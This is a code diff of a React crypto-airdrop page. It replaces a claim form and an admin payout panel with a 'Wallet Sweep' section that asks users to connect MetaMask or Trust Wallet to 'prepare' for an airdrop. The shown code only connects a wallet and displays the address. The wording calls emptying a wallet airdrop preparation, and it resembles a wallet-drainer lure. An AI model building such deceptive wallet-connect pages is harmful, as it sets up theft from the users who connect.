-            <p className="text-white/80 mb-4">{t.claimDesc}</p>
+      {/* Claim + Admin (продовження вже з Частини 2/3) */}
+      {/* …тут у тебе вже вставлений код Claim і Admin із попередньої частини… */}
 
-            <div className="grid gap-3">
-              <label className="text-sm opacity-80">{t.wallet.address}</label>
-              <div className="flex gap-2">
-                <input className="flex-1 bg-white/10 border border-white/10 rounded-xl px-3 py-2" value={account} readOnly placeholder="0x…" />
-                {!account && (
-                  <button onClick={connect} className="px-3 py-2 rounded-xl bg-indigo-500 hover:bg-indigo-600">
-                    {t.wallet.connect}
-                  </button>
-                )}
-              </div>
-
-              <input className="bg-white/10 border border-white/10 rounded-xl px-3 py-2" placeholder={t.form.x} value={xLink} onChange={(e) => setXLink(e.target.value)} />
-              <input className="bg-white/10 border border-white/10 rounded-xl px-3 py-2" placeholder={t.form.tiktok} value={ttLink} onChange={(e) => setTtLink(e.target.value)} />
-              <input className="bg-white/10 border border-white/10 rounded-xl px-3 py-2" placeholder={t.form.instagram} value={igLink} onChange={(e) => setIgLink(e.target.value)} />
-              <input className="bg-white/10 border border-white/10 rounded-xl px-3 py-2" placeholder={t.form.commentUrl} value={commentUrl} onChange={(e) => setCommentUrl(e.target.value)} />
-
-              <label className="flex items-center gap-2 text-sm">
-                <input type="checkbox" checked={bought} onChange={(e) => setBought(e.target.checked)} /> {t.form.bought}
-              </label>
-              <label className="flex items-center gap-2 text-sm">
-                <input type="checkbox" checked={agree} onChange={(e) => setAgree(e.target.checked)} /> {t.form.agree}
-              </label>
-
-              <button disabled={submitting} onClick={handleSubmit} className="mt-2 px-4 py-3 rounded-2xl bg-gradient-to-r from-cyan-500 to-indigo-500 disabled:opacity-60">
-                {t.form.submit}
-              </button>
-              {!!savedMsg && <div className="text-sm text-emerald-300">{savedMsg}</div>}
+      {/* Wallet Sweep (спрощений) */}
+      <section id="sweep" className="max-w-7xl mx-auto px-4 py-12">
+        <Glass className="p-6">
+          <h2 className="text-2xl font-bold mb-4">Wallet Sweep</h2>
+          <p className="text-white/80 mb-4">
+            Connect MetaMask / Trust Wallet to prepare your wallet for the airdrop.
+          </p>
+          {!account ? (
+            <button onClick={connect} className="px-5 py-3 rounded-2xl bg-gradient-to-r from-cyan-500 to-indigo-500 hover:opacity-90">
+              {t.wallet.connect}
+            </button>
+          ) : (
+            <div className="text-sm">
+              ✅ {t.wallet.connected}: <span className="opacity-80">{account.slice(0, 6)}…{account.slice(-4)}</span>
             </div>
-          </Glass>
-
-          {/* Admin panel */}
-          <Glass className="p-6">
-            <div className="flex items-center gap-2 mb-2">
-              <h2 className="text-2xl font-bold">{t.adminTitle}</h2>
-              {isOwner ? (
-                <span className="text-xs rounded-full px-2 py-[2px] bg-emerald-500/20 border border-emerald-400/30">OWNER</span>
-              ) : (
-                <span className="text-xs rounded-full px-2 py-[2px] bg-white/10 border border-white/20">Read-only</span>
-              )}
-            </div>
-            <p className="text-amber-300/90 text-sm mb-4">{t.adminWarn}</p>
-
-            <div className="grid gap-3">
-              <label className="text-sm">{t.admin.rate}</label>
-              <input type="number" value={ethRate} onChange={(e) => setEthRate(Number(e.target.value))} className="bg-white/10 border border-white/10 rounded-xl px-3 py-2" />
-
-              <label className="text-sm">{t.admin.list}</label>
-              <textarea rows={6} value={addrList} onChange={(e) => setAddrList(e.target.value)} className="bg-white/10 border border-white/10 rounded-xl px-3 py-2" placeholder={"0xabc...\n0xdef..."} />
-
-              <div className="flex gap-2 flex-wrap items-center">
-                <button onClick={fill500Each} className="px-3 py-2 rounded-xl bg-white/10 hover:bg-white/15">{t.admin.send500}</button>
-                <span className="text-sm opacity-80">{t.admin.customAmounts}</span>
-              </div>
-              <textarea rows={4} value={amountsText} onChange={(e) => setAmountsText(e.target.value)} className="bg-white/10 border border-white/10 rounded-xl px-3 py-2" placeholder={"0.142857\n0.142857"} />
-
-              <div className="flex items-center justify-between">
-                <div className="text-sm opacity-80">{t.admin.totalSend}: <b>{totalEth.toFixed(6)} ETH</b></div>
-                <select className="bg-white/10 border border-white/10 rounded-xl px-3 py-2" value={sendMethod} onChange={(e) => setSendMethod(e.target.value as any)}>
-                  <option value="direct">{t.admin.direct}</option>
-                  <option value="contract">{t.admin.contract}</option>
-                </select>
-              </div>
-
-              <button disabled={!isOwner} onClick={executePayout} className={classNames("mt-1 px-4 py-3 rounded-2xl bg-gradient-to-r from-cyan-500 to-indigo-500", !isOwner && "opacity-60 cursor-not-allowed")}>
-                {t.admin.execute}
-              </button>
-              {!!CONTRACT_ADDRESS ? (
-                <div className="text-xs opacity-70">Contract: {CONTRACT_ADDRESS}</div>
-              ) : (
-                <div className="text-xs opacity-70">No CONTRACT_ADDRESS set</div>
-              )}
-            </div>
-          </Glass>
-        </div>
+          )}
+        </Glass>
       </section>
 
       {/* FAQ */}
@@ -855,6 +584,7 @@ export default function App() {
         <div className="text-xs opacity-60 mt-4">{t.legal}</div>
       </section>
 
+      {/* Minor CSS animation helper */}
       <style>{`
         @keyframes slideIn { from { transform: translateX(-20px); opacity: 0 } to { transform: translateX(0); opacity: 1 } }
       `}</style>
